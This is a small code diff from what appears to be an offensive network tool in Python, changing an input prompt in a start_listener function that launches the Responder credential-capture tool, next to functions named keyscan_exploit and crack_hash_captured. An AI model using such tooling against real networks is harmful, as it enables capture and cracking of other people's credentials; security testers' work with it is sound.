@@ -1783,7 +1783,7 @@ def keyscan_exploit():
         file.write(clean_content)
 
 def start_listener():
-    interface_name = input("Enter interface: ")
+    interface_name = input("Enter network interface: ")
     start_listener = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python2 Responder/Responder.py -I {}; exec bash"'.format(interface_name)])
 
 def crack_hash_captured():
